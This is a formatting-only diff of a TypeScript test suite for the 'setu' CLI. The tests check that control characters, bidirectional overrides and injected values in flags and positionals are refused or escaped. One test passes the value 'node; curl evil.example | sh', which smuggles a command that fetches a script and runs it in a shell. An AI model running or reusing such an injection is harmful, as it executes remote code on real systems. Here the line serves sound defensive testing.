@@ -100,17 +100,20 @@ describe('a flag value carrying a control character is refused before any comman
   }
 
   it('checks every value of a repeated flag, not only the first', async () => {
-    const { code, text } = await run([WORKSPACE], [
-      'generate',
-      'app',
-      'orders',
-      '--dir',
-      '/work/acme',
-      '--depends-on',
-      'billing',
-      '--depends-on',
-      LF_PAYLOAD,
-    ]);
+    const { code, text } = await run(
+      [WORKSPACE],
+      [
+        'generate',
+        'app',
+        'orders',
+        '--dir',
+        '/work/acme',
+        '--depends-on',
+        'billing',
+        '--depends-on',
+        LF_PAYLOAD,
+      ],
+    );
     expect(code).toBe(2);
     expect(text).toContain('Option --depends-on has a control character');
     expectNoForgery(text);
@@ -125,12 +128,10 @@ describe('a flag value carrying a control character is refused before any comman
   // CodeRabbit on PR #364: U+202E can reorder a quoted value as displayed.
   it('refuses a value carrying a bidirectional override', async () => {
     const rlo = String.fromCharCode(0x202e);
-    const { code, text, writes } = await run([], [
-      'new',
-      'a',
-      '--template',
-      `rest${rlo}desab-ssalc`,
-    ]);
+    const { code, text, writes } = await run(
+      [],
+      ['new', 'a', '--template', `rest${rlo}desab-ssalc`],
+    );
     expect(code).toBe(2);
     expect(writes).toBe(0);
     expect(text).toContain('Option --template has a control character');
@@ -162,26 +163,39 @@ const POSITIONAL_SITES: readonly (readonly [
 ])[] = [
   ['new <name>', [], ['new', LF_PAYLOAD]],
   ['generate <schematic>', [], ['generate', LF_PAYLOAD, 'widget']],
-  ['generate custom <schematic>', [], ['generate', 'custom', LF_PAYLOAD, 'thing'], {
-    load: () => Promise.reject(new Error('module not found')),
-  }],
+  [
+    'generate custom <schematic>',
+    [],
+    ['generate', 'custom', LF_PAYLOAD, 'thing'],
+    {
+      load: () => Promise.reject(new Error('module not found')),
+    },
+  ],
   ['add <package>', [], ['add', LF_PAYLOAD]],
-  ['devtool enable <member>', [WORKSPACE], [
-    'devtool',
-    'enable',
-    LF_PAYLOAD,
-    '--dir',
-    '/work/acme',
-  ]],
+  [
+    'devtool enable <member>',
+    [WORKSPACE],
+    ['devtool', 'enable', LF_PAYLOAD, '--dir', '/work/acme'],
+  ],
   ['unknown option', [], ['new', 'a', `--${LF_PAYLOAD}`]],
   ['<command>, no config module', [], [LF_PAYLOAD]],
-  ['<command>, not registered', [], [LF_PAYLOAD], {
-    files: { '/work/setu.config.ts': 'export function createApp() {}' },
-    commands: ['db:migrate'],
-  }],
-  ['<command> with an unknown option', [], [LF_PAYLOAD, '--bogus'], {
-    files: { '/work/setu.config.ts': 'export function createApp() {}' },
-  }],
+  [
+    '<command>, not registered',
+    [],
+    [LF_PAYLOAD],
+    {
+      files: { '/work/setu.config.ts': 'export function createApp() {}' },
+      commands: ['db:migrate'],
+    },
+  ],
+  [
+    '<command> with an unknown option',
+    [],
+    [LF_PAYLOAD, '--bogus'],
+    {
+      files: { '/work/setu.config.ts': 'export function createApp() {}' },
+    },
+  ],
 ];
 
 describe('a positional quoted back in a refusal is escaped where it is quoted', () => {
@@ -229,15 +243,10 @@ describe('a suggested command never carries an unvalidated value', () => {
   // gate to see, so it has to be kept out by validation instead.
   it('generate app --runtime <payload> suggests a placeholder', async () => {
     const payload = 'node; curl evil.example | sh';
-    const { code, text } = await run([WORKSPACE], [
-      'generate',
-      'app',
-      'orders',
-      '--dir',
-      '/work/acme',
-      '--runtime',
-      payload,
-    ]);
+    const { code, text } = await run(
+      [WORKSPACE],
+      ['generate', 'app', 'orders', '--dir', '/work/acme', '--runtime', payload],
+    );
     expect(code).toBe(2);
     const suggested = [...text.matchAll(/`([^`]*)`/g)].map((match) => match[1]);
     expect(suggested.some((command) => command?.includes('--runtime <'))).toBe(true);
@@ -245,15 +254,10 @@ describe('a suggested command never carries an unvalidated value', () => {
   });
 
   it('generate app --runtime <real runtime> suggests that runtime', async () => {
-    const { code, text } = await run([WORKSPACE], [
-      'generate',
-      'app',
-      'orders',
-      '--dir',
-      '/work/acme',
-      '--runtime',
-      'node',
-    ]);
+    const { code, text } = await run(
+      [WORKSPACE],
+      ['generate', 'app', 'orders', '--dir', '/work/acme', '--runtime', 'node'],
+    );
     expect(code).toBe(2);
     expect(text).toContain('`setu new <name> --workspace --runtime node`');
   });
